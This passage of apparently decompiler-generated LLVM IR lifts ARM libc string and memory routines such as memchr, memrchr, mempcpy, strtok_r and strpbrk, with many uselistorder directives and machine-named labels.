  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 5, 2, 7, 0, 8, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 42, 19, 20, 21, 3, 39, 4, 22, 41, 23, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 5, 2, 7, 0, 8, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 48, 20, 21, 22, 23, 24, 3, 45, 4, 25, 47, 26, 46, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_14f48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14edc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e10, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_14d9c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14d60, { 1, 0 }
  uselistorder label %dec_label_pc_14d4c, { 1, 0 }
  uselistorder label %dec_label_pc_14d0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ca0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14bd4, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_14b48, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14b08, { 1, 0 }
}

define i32 @function_14f68(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f68:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_14f70 = load i32, i32* @r0, align 4
  %v1_14f70 = load i32, i32* @r1, align 4
  %v2_14f70 = inttoptr i32 %v0_14f70 to i8*
  %v3_14f70 = call i32 @_memcpy(i8* %v2_14f70, i32 %v1_14f70)
  ret i32 %v3_14f70

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_14f80 = load i32, i32* @r4, align 4
  %v6_14f80 = load i32, i32* @r5, align 4
  %v9_14f80 = load i32, i32* @r6, align 4
  %v1_14f84 = urem i32 %arg1, 256
  %v0_14fa018 = load i32, i32* @r2, align 4
  %v2_14fa020 = icmp eq i32 %v0_14fa018, 0
  br i1 %v2_14fa020, label %dec_label_pc_14fb0, label %dec_label_pc_14fa8

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14fa8
  %v3_14f8c = load i8, i8* %.021, align 1
  %v4_14f8c = zext i8 %v3_14f8c to i32
  %v9_14f90 = icmp eq i32 %v4_14f8c, %v1_14f84
  %v1_14f94 = add i32 %v0_14f94, -1
  br i1 %v9_14f90, label %bb, label %dec_label_pc_14fa0

bb:                                               ; preds = %dec_label_pc_14f8c
  ret i32 %v1_14fa8

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f8c
  %v2_14f9c = add i32 %v1_14fa8, 1
  %v3_14f9c = inttoptr i32 %v2_14f9c to i8*
  %v2_14fa0 = icmp eq i32 %v1_14f94, 0
  br i1 %v2_14fa0, label %dec_label_pc_14fb0, label %dec_label_pc_14fa8

dec_label_pc_14fa8:                               ; preds = %entry, %dec_label_pc_14fa0
  %v0_14f94 = phi i32 [ %v1_14f94, %dec_label_pc_14fa0 ], [ %v0_14fa018, %entry ]
  %.021 = phi i8* [ %v3_14f9c, %dec_label_pc_14fa0 ], [ undef, %entry ]
  %v1_14fa8 = ptrtoint i8* %.021 to i32
  %v2_14fa8 = urem i32 %v1_14fa8, 4
  %v3_14fa8 = icmp eq i32 %v2_14fa8, 0
  br i1 %v3_14fa8, label %dec_label_pc_14fb0, label %dec_label_pc_14f8c

dec_label_pc_14fb0:                               ; preds = %dec_label_pc_14fa0, %dec_label_pc_14fa8, %entry
  %v0_1503c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_14fa0 ], [ %v0_14f94, %dec_label_pc_14fa8 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_14f9c, %dec_label_pc_14fa0 ], [ %.021, %dec_label_pc_14fa8 ]
  %v4_14fb0 = mul nuw nsw i32 %v1_14f84, 256
  %v5_14fb0 = or i32 %v4_14fb0, %v1_14f84
  %v1_14fb4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_14fb4, i32* @ip, align 4
  %v4_14fb8 = mul i32 %v5_14fb0, 65536
  %v5_14fb8 = or i32 %v4_14fb8, %v5_14fb0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1503c37, 3
  br i1 %tmp, label %dec_label_pc_14fc0, label %dec_label_pc_15064.preheader

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14fb0, %dec_label_pc_1503c.backedge
  %v0_14fdc82 = phi i32 [ %v1_14fdc, %dec_label_pc_1503c.backedge ], [ %v0_1503c37, %dec_label_pc_14fb0 ]
  %v0_14fc081 = phi i32 [ %v4_14fc0, %dec_label_pc_1503c.backedge ], [ %v1_14fb4, %dec_label_pc_14fb0 ]
  %v1_14fc0 = inttoptr i32 %v0_14fc081 to i32*
  %v2_14fc0 = load i32, i32* %v1_14fc0, align 4
  %v4_14fc0 = add i32 %v0_14fc081, 4
  store i32 %v4_14fc0, i32* @ip, align 4
  %v2_14fc4 = xor i32 %v2_14fc0, %v5_14fb8
  %v2_14fc8 = add i32 %v2_14fc4, 2130640639
  %v1_14fcc = sub i32 -1, %v2_14fc4
  %v2_14fd0 = xor i32 %v2_14fc8, %v1_14fcc
  %v2_14fd4 = and i32 %v2_14fd0, -2130640640
  %v2_14fd8 = icmp eq i32 %v2_14fd4, 0
  %v1_14fdc = add i32 %v0_14fdc82, -4
  br i1 %v2_14fd8, label %dec_label_pc_1503c.backedge, label %dec_label_pc_14fe4

dec_label_pc_1503c.backedge:                      ; preds = %dec_label_pc_14fc0, %dec_label_pc_15028
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_14fdc, 3
  br i1 %tmp107, label %dec_label_pc_14fc0, label %dec_label_pc_15064.preheader

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fc0
  %v2_14fe4 = inttoptr i32 %v0_14fc081 to i8*
  %v3_14fe4 = load i8, i8* %v2_14fe4, align 1
  %v4_14fe4 = zext i8 %v3_14fe4 to i32
  %v9_14fec = icmp eq i32 %v4_14fe4, %v1_14f84
  %v1_14ff0 = add i32 %v0_14fc081, 3
  %v1_14ff4 = add i32 %v0_14fc081, 1
  store i32 %v1_14ff4, i32* @lr, align 4
  %v1_14ff8 = add i32 %v0_14fc081, 2
  br i1 %v9_14fec, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_14fe4
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 %v0_14fc081

bb51:                                             ; preds = %dec_label_pc_14fe4
  %v2_15000 = inttoptr i32 %v1_14ff4 to i8*
  %v3_15000 = load i8, i8* %v2_15000, align 1
  %v4_15000 = zext i8 %v3_15000 to i32
  %v9_15004 = icmp eq i32 %v4_15000, %v1_14f84
  br i1 %v9_15004, label %dec_label_pc_1500c, label %dec_label_pc_15014

dec_label_pc_1500c:                               ; preds = %bb51
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 %v1_14ff4

dec_label_pc_15014:                               ; preds = %bb51
  %v2_15014 = inttoptr i32 %v1_14ff8 to i8*
  %v3_15014 = load i8, i8* %v2_15014, align 1
  %v4_15014 = zext i8 %v3_15014 to i32
  %v9_15018 = icmp eq i32 %v4_15014, %v1_14f84
  br i1 %v9_15018, label %dec_label_pc_15020, label %dec_label_pc_15028

dec_label_pc_15020:                               ; preds = %dec_label_pc_15014
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 %v1_14ff8

dec_label_pc_15028:                               ; preds = %dec_label_pc_15014
  %v2_15028 = inttoptr i32 %v1_14ff0 to i8*
  %v3_15028 = load i8, i8* %v2_15028, align 1
  %v4_15028 = zext i8 %v3_15028 to i32
  %v9_1502c = icmp eq i32 %v4_15028, %v1_14f84
  br i1 %v9_1502c, label %dec_label_pc_15034, label %dec_label_pc_1503c.backedge

dec_label_pc_15034:                               ; preds = %dec_label_pc_15028
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 %v1_14ff0

dec_label_pc_15064.preheader:                     ; preds = %dec_label_pc_1503c.backedge, %dec_label_pc_14fb0
  %v0_14fc0.lcssa = phi i32 [ %v1_14fb4, %dec_label_pc_14fb0 ], [ %v4_14fc0, %dec_label_pc_1503c.backedge ]
  %v0_14fdc.lcssa = phi i32 [ %v0_1503c37, %dec_label_pc_14fb0 ], [ %v1_14fdc, %dec_label_pc_1503c.backedge ]
  %v2_1506411 = icmp eq i32 %v0_14fdc.lcssa, 0
  br i1 %v2_1506411, label %dec_label_pc_1506c, label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_15064, %dec_label_pc_15064.preheader
  %v0_15064.in = phi i32 [ %v0_15064, %dec_label_pc_15064 ], [ %v0_14fdc.lcssa, %dec_label_pc_15064.preheader ]
  %v15_1505c = phi i32 [ %v1_15060, %dec_label_pc_15064 ], [ %v0_14fc0.lcssa, %dec_label_pc_15064.preheader ]
  %v0_15064 = add i32 %v0_15064.in, -1
  %v1_15054 = inttoptr i32 %v15_1505c to i8*
  %v2_15054 = load i8, i8* %v1_15054, align 1
  %v3_15054 = zext i8 %v2_15054 to i32
  %v9_15058 = icmp eq i32 %v3_15054, %v1_14f84
  br i1 %v9_15058, label %bb52, label %dec_label_pc_15064

bb52:                                             ; preds = %dec_label_pc_15054
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 %v15_1505c

dec_label_pc_15064:                               ; preds = %dec_label_pc_15054
  %v1_15060 = add i32 %v15_1505c, 1
  %v2_15064 = icmp eq i32 %v0_15064, 0
  br i1 %v2_15064, label %dec_label_pc_1506c, label %dec_label_pc_15054

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15064, %dec_label_pc_15064.preheader
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  store i32 %v9_14f80, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1505c, { 1, 0, 2 }
  uselistorder i32 %v1_14fdc, { 1, 0, 2 }
  uselistorder i32 %v4_14fc0, { 0, 2, 1 }
  uselistorder i32 %v0_14fc081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14fb0, { 1, 0 }
  uselistorder i32 %v0_1503c37, { 1, 2, 0 }
  uselistorder i32 %v1_14f84, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_14f80, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1503c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14fc0, { 1, 0 }
  uselistorder label %dec_label_pc_14fb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14fa8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_15088 = call i32 @memcpy()
  %v0_1508c = load i32, i32* @r5, align 4
  %v1_1508c = load i32, i32* @r4, align 4
  %v2_1508c = add i32 %v1_1508c, %v0_1508c
  ret i32 %v2_1508c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_15094 = load i32, i32* @r4, align 4
  %v1_15098 = urem i32 %arg2, 256
  %v2_1509c = add i32 %arg3, %arg1
  %v2_150b42 = icmp eq i32 %arg3, 0
  br i1 %v2_150b42, label %dec_label_pc_150c4, label %dec_label_pc_150bc

dec_label_pc_150a4:                               ; preds = %dec_label_pc_150bc
  %v1_150a4 = add i32 %v0_150a4, -1
  %v2_150a4 = inttoptr i32 %v1_150a4 to i8*
  %v3_150a4 = load i8, i8* %v2_150a4, align 1
  %v4_150a4 = zext i8 %v3_150a4 to i32
  %v9_150a8 = icmp eq i32 %v4_150a4, %v1_15098
  br i1 %v9_150a8, label %bb, label %dec_label_pc_150b4

bb:                                               ; preds = %dec_label_pc_150a4
  ret i32 %v1_150a4

dec_label_pc_150b4:                               ; preds = %dec_label_pc_150a4
  %v1_150b0 = add i32 %v0_150b0, -1
  %v2_150b4 = icmp eq i32 %v1_150b0, 0
  br i1 %v2_150b4, label %dec_label_pc_150c4, label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %entry, %dec_label_pc_150b4
  %v0_150b0 = phi i32 [ %v1_150b0, %dec_label_pc_150b4 ], [ %arg3, %entry ]
  %v0_150a4 = phi i32 [ %v1_150a4, %dec_label_pc_150b4 ], [ %v2_1509c, %entry ]
  %v1_150bc = urem i32 %v0_150a4, 4
  %v2_150bc = icmp eq i32 %v1_150bc, 0
  br i1 %v2_150bc, label %dec_label_pc_150c4, label %dec_label_pc_150a4

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150b4, %dec_label_pc_150bc, %entry
  %v0_1515c11 = phi i32 [ %v2_1509c, %entry ], [ %v1_150a4, %dec_label_pc_150b4 ], [ %v0_150a4, %dec_label_pc_150bc ]
  %v0_151487 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_150b4 ], [ %v0_150b0, %dec_label_pc_150bc ]
  %v4_150c4 = mul nuw nsw i32 %v1_15098, 256
  %v5_150c4 = or i32 %v4_150c4, %v1_15098
  %v4_150c8 = mul i32 %v5_150c4, 65536
  %v5_150c8 = or i32 %v4_150c8, %v5_150c4
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_151487, 3
  br i1 %tmp, label %dec_label_pc_150d0, label %dec_label_pc_15158

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150c4, %.backedge.backedge
  %v0_150ec51 = phi i32 [ %v1_150ec, %.backedge.backedge ], [ %v0_151487, %dec_label_pc_150c4 ]
  %v0_150d050 = phi i32 [ %v1_150d0, %.backedge.backedge ], [ %v0_1515c11, %dec_label_pc_150c4 ]
  %v1_150d0 = add i32 %v0_150d050, -4
  %v2_150d0 = inttoptr i32 %v1_150d0 to i32*
  %v3_150d0 = load i32, i32* %v2_150d0, align 4
  %v2_150d4 = xor i32 %v3_150d0, %v5_150c8
  %v2_150d8 = add i32 %v2_150d4, 2130640639
  %v1_150dc = sub i32 -1, %v2_150d4
  %v2_150e0 = xor i32 %v2_150d8, %v1_150dc
  %v2_150e4 = and i32 %v2_150e0, -2130640640
  %v2_150e8 = icmp eq i32 %v2_150e4, 0
  %v1_150ec = add i32 %v0_150ec51, -4
  br i1 %v2_150e8, label %.backedge.backedge, label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150d0
  %v1_150f4 = add i32 %v0_150d050, -1
  %v2_150f4 = inttoptr i32 %v1_150f4 to i8*
  %v3_150f4 = load i8, i8* %v2_150f4, align 1
  %v4_150f4 = zext i8 %v3_150f4 to i32
  %v9_150f8 = icmp eq i32 %v4_150f4, %v1_15098
  %v1_150fc = add i32 %v0_150d050, -2
  store i32 %v1_150fc, i32* @ip, align 4
  %v1_15104 = add i32 %v0_150d050, -3
  store i32 %v1_15104, i32* @lr, align 4
  br i1 %v9_150f8, label %dec_label_pc_1510c, label %dec_label_pc_15114

dec_label_pc_1510c:                               ; preds = %dec_label_pc_150f4
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 %v1_150f4

dec_label_pc_15114:                               ; preds = %dec_label_pc_150f4
  %v2_15114 = inttoptr i32 %v1_150fc to i8*
  %v3_15114 = load i8, i8* %v2_15114, align 1
  %v4_15114 = zext i8 %v3_15114 to i32
  %v9_15118 = icmp eq i32 %v4_15114, %v1_15098
  br i1 %v9_15118, label %dec_label_pc_15120, label %dec_label_pc_15128

dec_label_pc_15120:                               ; preds = %dec_label_pc_15114
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 %v1_150fc

dec_label_pc_15128:                               ; preds = %dec_label_pc_15114
  %v2_15128 = inttoptr i32 %v1_15104 to i8*
  %v3_15128 = load i8, i8* %v2_15128, align 1
  %v4_15128 = zext i8 %v3_15128 to i32
  %v9_1512c = icmp eq i32 %v4_15128, %v1_15098
  br i1 %v9_1512c, label %dec_label_pc_15134, label %dec_label_pc_1513c

dec_label_pc_15134:                               ; preds = %dec_label_pc_15128
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 %v1_15104

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15128
  %v1_1513c = inttoptr i32 %v1_150d0 to i8*
  %v2_1513c = load i8, i8* %v1_1513c, align 1
  %v3_1513c = zext i8 %v2_1513c to i32
  %v9_15140 = icmp eq i32 %v3_1513c, %v1_15098
  br i1 %v9_15140, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1513c, %dec_label_pc_150d0
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_150ec, 3
  br i1 %tmp70, label %dec_label_pc_150d0, label %dec_label_pc_15158

bb19:                                             ; preds = %dec_label_pc_1513c
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 %v1_150d0

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15158
  %v1_15168 = add i32 %v0_15168, -1
  %v1_1515c = add i32 %v0_1515c, -1
  %v2_1515c = inttoptr i32 %v1_1515c to i8*
  %v3_1515c = load i8, i8* %v2_1515c, align 1
  %v4_1515c = zext i8 %v3_1515c to i32
  %v9_15160 = icmp eq i32 %v4_1515c, %v1_15098
  br i1 %v9_15160, label %bb20, label %dec_label_pc_15158

bb20:                                             ; preds = %dec_label_pc_1515c
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 %v1_1515c

dec_label_pc_15158:                               ; preds = %dec_label_pc_150c4, %.backedge.backedge, %dec_label_pc_1515c
  %v0_1515c = phi i32 [ %v1_1515c, %dec_label_pc_1515c ], [ %v0_1515c11, %dec_label_pc_150c4 ], [ %v1_150d0, %.backedge.backedge ]
  %v0_15168 = phi i32 [ %v1_15168, %dec_label_pc_1515c ], [ %v0_151487, %dec_label_pc_150c4 ], [ %v1_150ec, %.backedge.backedge ]
  %v2_15168 = icmp eq i32 %v0_15168, 0
  br i1 %v2_15168, label %dec_label_pc_15170, label %dec_label_pc_1515c

dec_label_pc_15170:                               ; preds = %dec_label_pc_15158
  store i32 %v3_15094, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_15168, { 1, 0 }
  uselistorder i32 %v1_150ec, { 1, 0, 2 }
  uselistorder i32 %v1_150d0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_150d050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_150c4, { 1, 0 }
  uselistorder i32 %v0_151487, { 1, 2, 0 }
  uselistorder i32 %v0_150a4, { 1, 0, 2 }
  uselistorder i32 %v1_150a4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1509c, { 1, 0 }
  uselistorder i32 %v1_15098, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15094, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15158, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150d0, { 1, 0 }
  uselistorder label %dec_label_pc_150c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150bc, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15180 = load i32, i32* @r4, align 4
  store i32 %v3_15180, i32* %stack_var_-16, align 4
  %v6_15180 = load i32, i32* @r5, align 4
  %v0_15184 = load i32, i32* @r0, align 4
  store i32 %v0_15184, i32* %r4.global-to-local, align 4
  %v2_15184 = icmp eq i32 %v0_15184, 0
  %v1_15188 = load i32, i32* @r2, align 4
  br i1 %v2_15184, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_15188 = inttoptr i32 %v1_15188 to i32*
  %v3_15188 = load i32, i32* %v2_15188, align 4
  store i32 %v3_15188, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1518c = phi i32 [ %v3_15188, %bb ], [ %v0_15184, %entry ]
  store i32 %v0_1518c, i32* @r0, align 4
  store i32 %v1_15188, i32* @r5, align 4
  %v0_15194 = load i32, i32* @r1, align 4
  store i32 %v0_15194, i32* %r6.global-to-local, align 4
  %v1_15198 = inttoptr i32 %v0_1518c to i8*
  %v2_15198 = call i32 @__GI_strspn(i8* %v1_15198)
  %v0_1519c = load i32, i32* %r4.global-to-local, align 4
  %v2_1519c = add i32 %v0_1519c, %v2_15198
  %v3_1519c = inttoptr i32 %v2_1519c to i8*
  %v4_1519c = load i8, i8* %v3_1519c, align 1
  %v6_1519c = zext i8 %v4_1519c to i32
  store i32 %v6_1519c, i32* %r3.global-to-local, align 4
  store i32 %v2_1519c, i32* @r4, align 4
  %v2_151a4 = icmp eq i8 %v4_1519c, 0
  store i1 %v2_151a4, i1* @cpsr_z, align 1
  %v0_151a8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_151a8, i32* @r1, align 4
  store i32 %v2_1519c, i32* @r0, align 4
  br i1 %v2_151a4, label %bb7, label %dec_label_pc_151b8

bb7:                                              ; preds = %entry._crit_edge
  %v2_151b0 = load i32, i32* @r5, align 4
  %v3_151b0 = inttoptr i32 %v2_151b0 to i32*
  store i32 %v2_1519c, i32* %v3_151b0, align 4
  br label %dec_label_pc_151ec

dec_label_pc_151b8:                               ; preds = %entry._crit_edge
  %v0_151b8 = call i32 @__GI_strpbrk()
  store i32 %v0_151b8, i32* %r2.global-to-local, align 4
  %v3_151bc = icmp eq i32 %v0_151b8, 0
  store i1 %v3_151bc, i1* @cpsr_z, align 1
  br i1 %v3_151bc, label %dec_label_pc_151cc, label %dec_label_pc_151dc

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151b8
  %v0_151c4 = load i32, i32* @r4, align 4
  %v2_151cc = call i32 @rawmemchr(i32 %v0_151c4, i32 0)
  %v0_151d0 = load i32, i32* @r4, align 4
  store i32 %v0_151d0, i32* %r3.global-to-local, align 4
  %v1_151d4 = load i32, i32* @r5, align 4
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  store i32 %v2_151cc, i32* %v2_151d4, align 4
  br label %dec_label_pc_151ec

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151b8
  %v3_151e0 = inttoptr i32 %v0_151b8 to i8*
  store i8 0, i8* %v3_151e0, align 1
  %v4_151e0 = load i32, i32* %r2.global-to-local, align 4
  %v5_151e0 = add i32 %v4_151e0, 1
  store i32 %v5_151e0, i32* %r2.global-to-local, align 4
  %v1_151e4 = load i32, i32* @r5, align 4
  %v2_151e4 = inttoptr i32 %v1_151e4 to i32*
  store i32 %v5_151e0, i32* %v2_151e4, align 4
  %v0_151e8 = load i32, i32* @r4, align 4
  store i32 %v0_151e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %bb7, %dec_label_pc_151cc, %dec_label_pc_151dc
  %v0_151ec = load i32, i32* %r3.global-to-local, align 4
  %v2_151f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_151f0, i32* @r4, align 4
  store i32 %v6_15180, i32* @r5, align 4
  ret i32 %v0_151ec

; uselistorder directives
  uselistorder i32 %v0_1518c, { 1, 0 }
  uselistorder i32 %v0_15184, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_151ec, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_151f4 = load i32, i32* @r0, align 4
  %v1_152182 = inttoptr i32 %v0_151f4 to i8*
  %v2_152183 = load i8, i8* %v1_152182, align 1
  %v3_152184 = zext i8 %v2_152183 to i32
  %v2_1521c5 = icmp eq i8 %v2_152183, 0
  br i1 %v2_1521c5, label %dec_label_pc_15218._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_15224.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_151fc:                               ; preds = %dec_label_pc_15204
  %v1_1520c = add i32 %v0_1520c, 1
  %v9_151fc = icmp eq i32 %v3_15204, %v3_152186
  br i1 %v9_151fc, label %dec_label_pc_1522c, label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151fc, %bb
  %v0_1520c = phi i32 [ %v1_1520c, %dec_label_pc_151fc ], [ %v0_15224.pre, %bb ]
  %v1_15204 = inttoptr i32 %v0_1520c to i8*
  %v2_15204 = load i8, i8* %v1_15204, align 1
  %v3_15204 = zext i8 %v2_15204 to i32
  store i32 %v3_15204, i32* @ip, align 4
  %v2_15208 = icmp eq i8 %v2_15204, 0
  br i1 %v2_15208, label %dec_label_pc_15214, label %dec_label_pc_151fc

